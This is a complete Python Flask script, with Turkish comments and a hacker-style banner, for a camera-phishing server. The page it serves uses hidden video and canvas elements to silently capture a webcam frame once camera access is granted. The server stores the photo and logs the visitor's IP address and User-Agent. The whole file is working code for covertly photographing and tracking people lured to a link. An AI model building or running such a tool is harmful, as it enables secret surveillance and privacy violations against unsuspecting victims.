from flask import Flask, request, make_response, send_from_directory, jsonify
import base64
import os
from datetime import datetime
import colorama
from colorama import Fore
import time

colorama.init()

time.sleep(1)
logo = '''
  ___    ___    ___      _____
 / _ \  / _ \  / _ \    / ____|
| (_) || (_) || | | |  | |       __ _  _ __ ___    ___  _ __
 \__, | \__, || | | |  | |      / _` || '_ ` _ \  / _ \| '__|
   / /    / / | |_| |  | |____ | (_| || | | | | ||  __/| |
  /_/    /_/   \___/    \_____| \__,_||_| |_| |_| \___||_|
'''
print(Fore.LIGHTCYAN_EX + logo)
print(Fore.LIGHTRED_EX + "\n[+] Sunucu başlatılıyor...\n")

app = Flask(__name__)

# uploads klasörünü ayarla
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
UPLOAD_FOLDER = os.path.join(BASE_DIR, "uploads")
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

@app.route('/')
def home():
    html_content = """
    <!DOCTYPE html>
    <html>
    <head>
      <title>Fotoğraf Çekiliyor</title>
    </head>
    <body>
      <video id="video" width="320" height="240" autoplay style="display:none;"></video>
      <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>

      <script>
  const video = document.getElementById("video");
  const canvas = document.getElementById("canvas");
  const context = canvas.getContext("2d");

  // Kamera açılınca fotoğraf çekme işlemi
  navigator.mediaDevices.getUserMedia({ video: true })
    .then((stream) => {
      video.srcObject = stream;
      video.play();

      // Akışın başlatılmasını bekleyin
      video.onloadedmetadata = () => {
        // Kamera açıldıktan sonra 3 saniye bekle
        setTimeout(() => {
          // Video'dan bir kare al
          context.drawImage(video, 0, 0, 320, 240);
          const dataUrl = canvas.toDataURL("image/png");

          // Fotoğrafı sunucuya gönder
          fetch("/upload", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ image: dataUrl }),
          })
          .then(response => response.json())
          .then(data => {
            console.log("Sunucu yanıtı:", data.image_url);
            alert("Fotoğraf yüklendi! URL: " + data.image_url);
          });
        }, 3000);  // Kamera açıldıktan sonra 3 saniye bekleyin
      };
    })
    .catch((err) => {
      alert("Kamera izni reddedildi veya desteklenmiyor.");
      console.error(err);
    });
</script>
    </body>
    </html>
    """
    return make_response(html_content)

@app.route('/upload', methods=['POST'])
def upload():
    try:
        data = request.json['image']
        header, encoded = data.split(",", 1)
        image_data = base64.b64decode(encoded)

        # Fotoğrafın kaydedileceği yolu belirle
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{timestamp}.png"
        filepath = os.path.join(UPLOAD_FOLDER, filename)

        # Fotoğrafı dosyaya yaz
        with open(filepath, "wb") as f:
            f.write(image_data)

        # Kullanıcı bilgilerini al
        ip_address = request.remote_addr
        user_agent = request.headers.get('User-Agent', 'Bilinmiyor')
        image_url = f"http://{request.host}/uploads/{filename}"

        # Terminal logları
        print(Fore.MAGENTA + "\n[📸 YENİ FOTOĞRAF ALINDI]")
        print(Fore.LIGHTCYAN_EX + f"[+] IP Adresi   : {ip_address}")
        print(f"[+] User-Agent  : {user_agent}")
        print(f"[+] Dosya Yolu  : {filepath}")
        print(f"[+] Fotoğraf URL: {image_url}\n")

        return jsonify({"image_url": image_url})
    
    except Exception as e:
        print(Fore.RED + f"[HATA] Fotoğraf yüklenemedi: {e}")
        return jsonify({"error": "Yükleme sırasında hata oluştu."}), 500

@app.route('/uploads/<filename>')
def uploaded_file(filename):
    return send_from_directory(UPLOAD_FOLDER, filename)

if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=5000)